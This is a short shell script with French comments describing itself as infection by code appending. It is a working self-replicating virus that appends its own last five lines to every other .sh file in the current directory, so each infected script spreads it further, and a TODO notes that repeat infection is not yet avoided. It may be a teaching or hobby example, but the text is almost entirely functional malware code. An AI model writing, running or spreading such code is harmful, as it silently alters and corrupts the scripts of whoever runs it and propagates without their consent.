#!/bin/sh

#infection par ajout de code
#liste tout les fichiers bash et s'ajoute automatiquement à la fin
# (garde les 5 dernières lignes qui vont se répliquer à chaque exec de programme)
# TODO  :eviter la surinfection
for i in *.sh; do
	if test "./$i" != "$0"; then
		tail -n 5 $0 >> $i;
	fi
done
